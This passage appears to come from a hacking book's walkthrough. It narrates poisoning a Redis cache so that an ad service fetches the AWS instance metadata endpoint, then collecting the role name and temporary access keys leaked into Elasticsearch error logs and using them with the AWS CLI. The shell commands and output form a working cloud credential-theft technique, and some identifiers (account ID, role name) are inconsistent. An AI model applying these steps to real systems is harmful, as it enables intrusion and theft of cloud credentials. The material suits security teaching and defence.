  md: "# Cache Poisoning\n\nWe continue exploring other keys in the Redis cache, hoping\
    \ for some new inspiration:\n\n```\nshell> head -100 all_redis_keys.txt\nvast_c88b4ab3d_19devear\n\
    select_3799ec543582b38c\nvast_c88b4ab3d_19devear\n--snip--\n```\n\nWe list the\
    \ contents of the key vast_c88b4ab3d_19devear and find a URL this time:\n\n```\n\
    shell> redis -h 10.59.12.47 get vast_c88b4ab3d_19devear\nhttps://www.goodadsby.com/vast/preview/9612353\n\
    ```\n\nVAST (Video Ad Serving Template) is a standard XML template for describing\
    \ ads to browser video players, including where to download the media, which tracking\
    \ events to send, after how many seconds, to which endpoint, and so on. Here is\
    \ an example of a VAST file pointing to a video file stored on s4d.mxrads.com\
    \ for an ad titled “Exotic Approach”:\n\n```\n<VAST version=\"3.0\">\n<Ad id=\"\
    1594\">\n  <InLine>\n    <AdSystem>MXR Ads revolution</AdSystem>\n    <AdTitle>Exotic\
    \ approach</AdTitle>\n--snip--\n    <MediaFile id=\"134130\" type=\"video/mp4\"\
    \n      bitrate=\"626\" width=\"1280\" height=\"720\">\n      http://s4d.mxrads.com/43ed9014730cb/12ad82436/vid/720/88b4a1cf2.mp4\n\
    --snip--\n```\n\nXML parsers can be such fickle beasts—the wrong tag, and all\
    \ hell breaks loose. The parser will spit out stack traces bigger than the original\
    \ file itself into the standard error output. So many exceptions that need to\
    \ be properly handled . . . and logged!\n\nSee where I’m going with this? We already\
    \ have access to the pods handling the application logs related to ad delivery.\
    \ If we replace a VAST URL with, say, the metadata API URL that responds with\
    \ a JSON/text format, will the application send a verbose error to the Elasticsearch\
    \ audit store that we can look at?\n\nOnly one way to find out. We replace a dozen\
    \ valid VAST URLs with the infamous endpoint URL http://169.254.169.254/latest/meta-data/iam/info,\
    \ like so:\n\n```\nshell> redis -h 10.59.12.47 set vast_c88b4ab3d_19devear\\\n\
    http://169.254.169.254/latest/meta-data/iam/info\nOK\n```"
  merge: -1
  img_proc: true
- pgno: 164
  md: "This metadata endpoint should return a JSON response containing the IAM role\
    \ attached to the node running the ads-rtb pod. We know the role exists because\
    \ EKS requires it. Bonus point: this role has some interesting privileges.\nIt\
    \ takes a good 10 minutes for one of the poisoned cache entries to be triggered,\
    \ but we finally get the verbose error we were hoping for. We can locate the error\
    \ in the log index by searching for MXR Ads' AWS account ID, 886371554408:\n\n\
    ```\nshell> curl \"10.20.86.24:9200/log/_search?pretty&size=10&q=message: 886371554408\"\
    \n\n\"level\": \"Critical\"\n\"message\": \"...\\\"InstanceProfileArn\\\" : \n\
    \\\" arn:aws:iam::886477354405:instance-profile/eks-workers-prod-common-NodeInstanceProfile-BZUD6DGQKFGC\\\
    \"...org.xml.sax.SAXParseException...Not valid XML file\"\n```\n\nThe pod that\
    \ triggered the query is running with the IAM role eks-workers-prod-common-NodeInstanceProfile-BZUD6DGQKFGC.\
    \ All we have to do now is poison the Redis cache once more, but this time append\
    \ the role name to the URL to fetch its temporary access keys:\n\n```\nshell>\
    \ redis -h 10.59.12.47 set vast_c88b4ab3d_19devear\\\nhttp://169.254.169.254/latest/meta-data/iam/security-credentials/eks-workers-prod-common-NodeInstanceRole-BZUD6DGQKFGC\n\
    OK\n```\n\nA few minutes later we get our coveted prize, valid AWS access keys\
    \ with EKS node privileges in the log index:\n\n```\nshell> curl \"10.20.86.24:9200/log/_search?pretty&size=10&q=message:\
    \ AccessKeyId\"\n\n\"level\": \"Critical\"\n\"message\": \"...\\\"AccessKeyId\\\
    \" : \\\"ASIA44ZRK6WS3R64ZPDI\\\", \\\"SecretAccessKey\\\" : \\\"\\n\\\"+EplZs...org.xml.sax.SAXParseException...Not\
    \ valid XML file\"\n```\n\nAccording to the AWS docs, the default role attached\
    \ to a Kubernetes node will have basic permissions over EC2 to discover its environment:\
    \ describe-instances, describe-security-groups, describe-volumes, describe-subnets,\
    \ and so on. Let's give these new credentials a spin and list all instances in\
    \ the eu-west-1 region (Ireland):\n\n```\nroot@Point1:~# vi ~/.aws/credentials\n\
    [node]\naws_access_key_id = ASIA4A4ZRK6WS3R64ZPDI\naws_secret_access_key = +EplZsWmW/5r/+B/+J5PrsmBZaNXyKKJ\n\
    aws_session_token = AgoJb3JpZ2luX2...\n\nroot@Point1:~# aws ec2 describe-instances\
    \ \\\n--region=eu-west-1 \\\n--profile node\n--snip--\n```"
